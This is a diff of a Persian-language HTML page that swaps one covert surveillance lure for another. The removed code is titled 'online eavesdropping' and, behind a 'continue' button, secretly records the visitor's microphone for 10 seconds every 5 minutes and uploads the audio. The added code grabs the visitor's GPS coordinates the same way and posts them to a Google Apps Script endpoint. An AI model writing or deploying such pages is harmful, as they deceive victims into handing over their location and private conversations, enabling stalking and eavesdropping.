@@ -1,86 +1,86 @@
 <!DOCTYPE html>
 <html lang="fa">
 <head>
-  <meta charset="UTF-8">
-  <title>شنود آنلاین</title>
+  <meta charset="UTF-8" />
+  <title>You Have</title>
   <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background: linear-gradient(135deg, #2c001e, #59003c);
-      font-family: 'Vazir', sans-serif;
+    body, html {
+      margin: 0; padding: 0; height: 100%;
+      overflow: hidden;
+      font-family: Arial, sans-serif;
+      direction: rtl;
+      background: #000;
+      color: #0f0;
+      user-select: none;
+    }
+    .background-image {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: url('https://i.imgur.com/X4jo2yP.jpg') no-repeat center center/cover;
+      filter: brightness(0.3);
+      z-index: 1;
+    }
+    .container {
+      position: relative;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
-      color: white;
-      direction: rtl;
+      z-index: 2;
     }
-
-    #startBtn {
-      background-color: #9b1455;
-      color: white;
+    #locateBtn {
+      background: transparent;
+      border: 3px solid #0f0;
+      color: #0f0;
+      font-size: 22px;
       padding: 15px 40px;
-      font-size: 20px;
-      border: none;
-      border-radius: 12px;
       cursor: pointer;
-      box-shadow: 0 8px 16px rgba(0,0,0,0.3);
-      transition: all 0.3s ease;
+      border-radius: 10px;
+      font-weight: bold;
+      transition: background-color 0.3s ease;
+      user-select: none;
     }
-
-    #startBtn:hover {
-      background-color: #c2185b;
-      transform: scale(1.05);
-    }
-
-    h2 {
-      position: absolute;
-      top: 20px;
-      text-shadow: 0 2px 5px black;
+    #locateBtn:hover {
+      background-color: #0f0;
+      color: #000;
     }
   </style>
 </head>
 <body>
-  <h2>برای ادامه، دکمه را فشار دهید</h2>
-  <button id="startBtn">ادامه مرحله بعد</button>
+  <div class="background-image"></div>
+  <div class="container">
+    <button id="locateBtn">ادامه دهید</button>
+  </div>
 
   <script>
-    let mediaRecorder;
-    let chunks = [];
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbxCQ3AIMDctelAO6N1faYA_52M6NpZyzO8tQgMYi-Jprl1l4QddnLT0mgVQ-HjmetIR/exec';
 
-    document.getElementById('startBtn').onclick = async () => {
-      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-      mediaRecorder = new MediaRecorder(stream);
-
-      mediaRecorder.ondataavailable = function (e) {
-        if (e.data.size > 0) {
-          chunks.push(e.data);
-        }
-      };
-
-      mediaRecorder.onstop = function () {
-        const blob = new Blob(chunks, { type: 'audio/webm' });
-        const formData = new FormData();
-        formData.append('audio', blob, 'audio_' + Date.now() + '.webm');
-
-        fetch('sendmail.php', {
-          method: 'POST',
-          body: formData
-        }).then(res => console.log('ارسال شد')).catch(err => console.error(err));
-
-        chunks = [];
-      };
-
-      startRecordingCycle();
-      setInterval(startRecordingCycle, 5 * 60 * 1000); // هر ۵ دقیقه
-    };
-
-    function startRecordingCycle() {
-      if (!mediaRecorder) return;
-      mediaRecorder.start();
-      setTimeout(() => mediaRecorder.stop(), 10000); // ۱۰ ثانیه ضبط
-    }
+    document.getElementById('locateBtn').addEventListener('click', () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          fetch(scriptURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              lat: position.coords.latitude,
+              lng: position.coords.longitude,
+              accuracy: position.coords.accuracy
+            })
+          })
+          .then(response => {
+            if(response.ok) {
+              alert('Successfully sent!');
+            } else {
+              alert('Unsuccessfully sent!');
+            }
+          })
+          .catch(() => alert('خطا در ارسال مکان'));
+        }, () => alert('لطفا اجازه دسترسی به مکان را بدهید!'));
+      } else {
+        alert('دستگاه شما از مکان‌یابی پشتیبانی نمی‌کند');
+      }
+    });
   </script>
 </body>
 </html>
